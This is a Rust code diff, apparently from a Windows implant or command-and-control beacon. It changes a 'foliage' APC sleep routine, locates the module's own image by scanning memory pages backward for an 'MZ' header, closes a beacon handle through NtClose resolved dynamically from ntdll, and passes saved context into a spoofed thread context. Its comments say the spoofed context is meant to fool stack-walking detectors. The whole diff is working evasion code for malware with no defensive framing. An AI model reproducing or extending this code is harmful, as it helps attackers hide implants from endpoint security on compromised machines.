@@ -120,18 +120,20 @@ pub(crate) struct TextRegion {
 /// # Safety
 /// PEB + PE header reads are stable post-load. Single-threaded context.
 pub(crate) unsafe fn own_text_region() -> Option<TextRegion> {
-    // PEB->ImageBaseAddress is at PEB + 0x10 on x64. resolve::peb_pointer()
-    // gives us the PEB via gs:[0x60].
-    let peb = crate::resolve::peb_pointer()?;
-    // image_base_address is the 7th field (after mutant) → offset 0x10.
-    // Read it as a raw usize to avoid the *mut c_void dance.
-    let base_ptr = unsafe { core::ptr::read_unaligned((peb as usize + 0x10) as *const usize) };
-    if base_ptr == 0 {
-        return None;
+    let mut addr = own_text_region as *const () as usize & !0xFFF;
+    loop {
+        let dos = addr as *const [u8; 2];
+        if !dos.is_null() && unsafe { *dos == [b'M', b'Z'] } {
+            break;
+        }
+        if addr < 0x1000 {
+            return None;
+        }
+        addr -= 0x1000;
     }
-    let (text_rva, text_size) = unsafe { section_va_len(base_ptr, b".text")? };
+    let (text_rva, text_size) = unsafe { section_va_len(addr, b".text")? };
     Some(TextRegion {
-        base: base_ptr + text_rva,
+        base: addr + text_rva,
         len: text_size,
     })
 }
@@ -449,6 +451,18 @@ unsafe fn execute_foliage_apc(
     let p = unsafe { Box::from_raw(params_ptr) };
     let _ = unsafe { Box::from_raw(p.saved_ctx) };
 
+    let nt_close_addr = crate::resolve::export_addr(b"ntdll.dll", b"NtClose");
+    if let Some(nt_close) = nt_close_addr {
+        type FnClose = unsafe extern "system" fn(usize) -> i32;
+        let close_fn: FnClose = core::mem::transmute(nt_close);
+        if p.beacon_handle != 0 {
+            close_fn(p.beacon_handle);
+        }
+        if handle != 0 {
+            close_fn(handle);
+        }
+    }
+
     if verified {
         FOLIAGE_APC_OK.store(1, core::sync::atomic::Ordering::Release);
         true
@@ -733,7 +747,7 @@ unsafe extern "system" fn foliage_helper(param: usize) -> u32 {
         // This makes stack-walking detectors see the gap address as a return
         // address, while the real RSP keeps the thread from faulting on the
         // first stack access.
-        let ctx = unsafe { crate::context::spoofed_context(rip, real_rsp) };
+        let ctx = unsafe { crate::context::spoofed_context(rip, real_rsp, p.saved_ctx) };
         // NtContinue is resolved on-demand (used only by the helper for the
         // APC, not needed for any other call).
         let ntc =
